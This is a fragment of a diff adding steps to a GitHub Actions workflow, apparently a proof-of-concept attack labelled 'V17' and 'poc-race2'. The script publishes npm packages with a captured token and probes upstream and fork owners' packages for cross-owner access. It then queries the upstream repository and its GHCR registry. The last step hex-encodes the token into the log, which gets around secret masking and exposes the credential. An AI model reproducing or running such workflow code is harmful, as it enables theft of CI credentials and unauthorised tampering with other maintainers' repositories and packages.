+            echo "{\"name\":\"@twrps/$PKG\",\"version\":\"1.0.0\",\"main\":\"index.js\",\"repository\":{\"type\":\"git\",\"url\":\"https://github.com/$FORK_OWNER/$FORK_REPO\"},\"publishConfig\":{\"registry\":\"https://npm.pkg.github.com\"}}" > package.json
+            echo "module.exports='v17';" > index.js
+            npm publish 2>&1 | tail -3
+          done
+          echo ""
+
+          # C: GitHub Packages — list all, try cross-owner operations
+          echo "--- C: Packages API ---"
+          for OWNER in "$UPSTREAM_OWNER" "$FORK_OWNER"; do
+            for TYPE in npm container nuget maven rubygems docker; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Authorization: token $RT" \
+                "$GH/users/$OWNER/packages?package_type=$TYPE")
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              PKGS=$(echo "$BODY" | jq length 2>/dev/null)
+              [ "$PKGS" != "0" ] && [ "$PKGS" != "null" ] && \
+                echo "C $OWNER/$TYPE = $CODE count=$PKGS | $(echo "$BODY" | jq -c '.[].name' 2>/dev/null | head -c 200)"
+            done
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 10: Final verification
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 10 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt 2>/dev/null || echo "$PATH")
+          echo "=== V17 FINAL ==="
+          RT=$(cat /tmp/rt.txt)
+          GH="https://api.github.com"
+
+          echo "--- Upstream state ---"
+          /usr/bin/curl -sS -H "Authorization: token $RT" "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO" \
+            | jq '{description,default_branch,visibility,homepage,archived}'
+
+          echo "--- Branches ---"
+          /usr/bin/curl -sS -H "Authorization: token $RT" "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/branches" \
+            | jq -c '.[]? | .name' 2>/dev/null
+
+          echo "--- Releases ---"
+          /usr/bin/curl -sS -H "Authorization: token $RT" "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/releases" \
+            | jq -c '.[]? | {tag_name,name}' 2>/dev/null
+
+          echo "--- GHCR tags ---"
+          GHCR=$(/usr/bin/curl -sS -u "lacaag:$RT" \
+            "https://ghcr.io/token?scope=repository:${UPSTREAM_OWNER}/poc-race2:pull&service=ghcr.io" \
+            | jq -r '.token // empty')
+          /usr/bin/curl -sS -H "Authorization: Bearer $GHCR" \
+            "https://ghcr.io/v2/${UPSTREAM_OWNER}/poc-race2/tags/list"
+
+          echo "--- All packages ---"
+          for S in "$UPSTREAM_OWNER" "$FORK_OWNER"; do
+            for T in npm container; do
+              /usr/bin/curl -sS -H "Authorization: token $RT" "$GH/users/$S/packages?package_type=$T" \
+                | jq -c '.[]? | {name,package_type,visibility}' 2>/dev/null
+            done
+          done
+
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+          echo "=== V17 COMPLETE ==="
